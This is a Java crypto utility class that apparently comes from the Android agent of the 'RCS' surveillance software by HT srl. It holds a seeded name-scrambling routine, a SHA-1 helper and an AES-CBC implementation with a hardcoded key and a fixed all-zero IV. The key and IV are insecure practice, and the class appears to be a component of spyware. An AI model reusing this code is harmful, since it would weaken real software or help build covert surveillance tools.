package com.ht.RCSAndroidGUI.crypto;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.action.sync.CommandException;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;

//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Encryption.java
 * Created      : 26-mar-2010
 * *************************************************/

/**
 * The Class Encryption.
 */
public class Encryption {

	// #ifdef DEBUG
	private static Debug debug = new Debug("Encryption");

	// #endif

	/**
	 * Descrambla una stringa, torna il puntatore al nome descramblato. La
	 * stringa ritornata va liberata dal chiamante con una free()!!!!
	 * 
	 * @param Name
	 *            the name
	 * @param seed
	 *            the seed
	 * @return the string
	 */
	public static String decryptName(final String Name, final int seed) {
		return scramble(Name, seed, false);
	}

	/**
	 * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
	 * ritornata va liberata dal chiamante con una free()!!!!
	 * 
	 * @param Name
	 *            the name
	 * @param seed
	 *            the seed
	 * @return the string
	 */
	public static String encryptName(final String Name, final int seed) {
		return scramble(Name, seed, true);
	}

	/**
	 * Gets the next multiple.
	 * 
	 * @param len
	 *            the len
	 * @return the next multiple
	 */
	public static int getNextMultiple(final int len) {
		// #ifdef DBC
		Check.requires(len >= 0, "len < 0");
		// #endif
		final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
		// #ifdef DBC
		Check.ensures(newlen >= len, "newlen < len");
		// #endif
		// #ifdef DBC
		Check.ensures(newlen % 16 == 0, "Wrong newlen");
		// #endif
		return newlen;
	}

	/**
	 * Questa funzione scrambla/descrambla una stringa e ritorna il puntatore
	 * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
	 * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
	 * a FALSE descrambla.
	 */
	private static String scramble(final String name, int seed,
			final boolean enc) {
		final char[] retString = name.toCharArray();
		final int len = name.length();
		int i, j;

		final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T',
				'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q', 'A', 'S', 'x', '4',
				'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l',
				'J', 'W', 'h', 'j', '0', 'm', '5', 'o', '2', 'E', 'r', 'L',
				't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
				'P', 'p', 'c', '7', 'g', '-', 'C' };

		final int alphabetLen = alphabet.length;

		if (seed < 0) {
			seed = -seed;
		}

		// Evita di lasciare i nomi originali anche se il byte e' 0
		seed = (seed > 0) ? seed %= alphabetLen : seed;

		if (seed == 0) {
			seed = 1;
		}

		// #ifdef DBC
		Check.asserts(seed > 0, "negative seed");
		// #endif

		for (i = 0; i < len; i++) {
			for (j = 0; j < alphabetLen; j++) {
				if (retString[i] == alphabet[j]) {
					// Se crypt e' TRUE cifra, altrimenti decifra
					if (enc) {
						retString[i] = alphabet[(j + seed) % alphabetLen];
					} else {
						retString[i] = alphabet[(j + alphabetLen - seed)
								% alphabetLen];
					}

					break;
				}
			}
		}

		return new String(retString);
	}

	Crypto crypto;

	boolean keyReady = false;

	/**
	 * Inits the.
	 */
	public static void init() {

	}

	/**
	 * Calcola il SHA1 del messaggio, usando la crypto api.
	 * 
	 * @param message
	 *            the message
	 * @return the byte[]
	 */
	public static byte[] SHA1(final byte[] message, int offset, int length) {
		MessageDigest digest;
		try {
			digest = MessageDigest.getInstance("SHA-1");

			digest.update(message, offset, length);
			final byte[] sha1 = digest.digest();

			return sha1;
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static byte[] SHA1(final byte[] message) {
		return SHA1(message, 0, message.length);
	}

	/**
	 * Instantiates a new encryption.
	 */
	public Encryption() {
		byte[] aesConfKey = new byte[] { (byte)0xa9, (byte)0x98, (byte)0x76, (byte)0x7f, (byte)0x8c, 
				 (byte)0x31, (byte)0x99, (byte)0xb0, (byte)0x33, (byte)0x8c, 
				 (byte)0xb2, (byte)0xd9, (byte)0x98, (byte)0x08, (byte)0x42, 
				 (byte)0x58 };

		crypto = new Crypto(aesConfKey);
	}

	/**
	 * Decrypt data.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @return the byte[]
	 * @throws CryptoException
	 */
	public byte[] decryptData(final byte[] cyphered) throws CryptoException {
		return decryptData(cyphered, cyphered.length, 0);
	}

	/**
	 * Decrypt data.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 * @throws CryptoException
	 */
	public byte[] decryptData(final byte[] cyphered, final int offset)
			throws CryptoException {
		return decryptData(cyphered, cyphered.length - offset, offset);
	}

	/**
	 * Decrypt data, CBC mode.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @param plainlen
	 *            the plainlen
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 * @throws CryptoException
	 */
	public byte[] decryptData(final byte[] cyphered, final int plainlen,
			final int offset) throws CryptoException {
		final int enclen = cyphered.length - offset;

		// #ifdef DBC
		Check.requires(keyReady, "Key not ready");
		Check.requires(enclen % 16 == 0, "Wrong padding");
		Check.requires(enclen >= plainlen, "Wrong plainlen");
		// #endif

		final byte[] plain = new byte[plainlen];
		byte[] iv = new byte[16];

		final byte[] pt = new byte[16];

		final int numblock = enclen / 16;
		final int lastBlockLen = plainlen % 16;
		for (int i = 0; i < numblock; i++) {
			final byte[] ct = Utils.copy(cyphered, i * 16 + offset, 16);

			crypto.decrypt(ct, pt);
			xor(pt, iv);
			iv = Utils.copy(ct);

			if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
				// and remaind
				// #ifdef DEBUG
				debug.trace("lastBlockLen: " + lastBlockLen);
				// #endif
				Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
			} else {
				Utils.copy(plain, i * 16, pt, 0, 16);
				// copyblock(plain, i, pt, 0);
			}
		}

		// #ifdef DBC
		Check.ensures(plain.length == plainlen, "wrong plainlen");
		// #endif
		return plain;
	}

	public byte[] encryptData(final byte[] plain) {
		return encryptData(plain, 0);
	}

	/**
	 * Encrypt data in CBC mode and HT padding
	 * 
	 * @param plain
	 *            the plain
	 * @return the byte[]
	 */
	public byte[] encryptData(final byte[] plain, int offset) {
		// #ifdef DBC
		Check.requires(keyReady, "Key not ready");
		// #endif

		final int len = plain.length - offset;

		// TODO: optimize, non creare padplain, considerare caso particolare
		// ultimo blocco
		final byte[] padplain = pad(plain, offset, len);

		final int clen = padplain.length;
		final byte[] crypted = new byte[clen];

		byte[] iv = new byte[16]; // iv e' sempre 0
		final byte[] ct = new byte[16];

		final int numblock = clen / 16;
		for (int i = 0; i < numblock; i++) {
			final byte[] pt = Utils.copy(padplain, i * 16, 16);
			xor(pt, iv);

			crypto.encrypt(pt, ct);
			Utils.copy(crypted, i * 16, ct, 0, 16);
			iv = Utils.copy(ct);
		}

		return crypted;
	}

	/**
	 * Old style Pad, PKCS5 is available in EncryptionPKCS5
	 * 
	 * @param plain
	 * @param offset
	 * @param len
	 * @return
	 */
	protected byte[] pad(byte[] plain, int offset, int len) {
		return pad(plain, offset, len, false);
	}

	protected byte[] pad(byte[] plain, int offset, int len, boolean PKCS5) {
		final int clen = getNextMultiple(len);
		if (clen > 0) {
			final byte[] padplain = new byte[clen];
			if (PKCS5) {
				int value = clen - len;
				for (int i = 1; i <= value; i++) {
					padplain[clen - i] = (byte) value;
				}
			}
			Utils.copy(padplain, 0, plain, offset, len);
			return padplain;
		} else {
			return plain;
		}
	}

	/**
	 * Xor.
	 * 
	 * @param pt
	 *            the pt
	 * @param iv
	 *            the iv
	 */
	void xor(final byte[] pt, final byte[] iv) {
		// #ifdef DBC
		Check.requires(pt.length == 16, "pt not 16 bytes long");
		Check.requires(iv.length == 16, "iv not 16 bytes long");
		// #endif

		for (int i = 0; i < 16; i++) {
			pt[i] ^= iv[i];
		}
	}


}
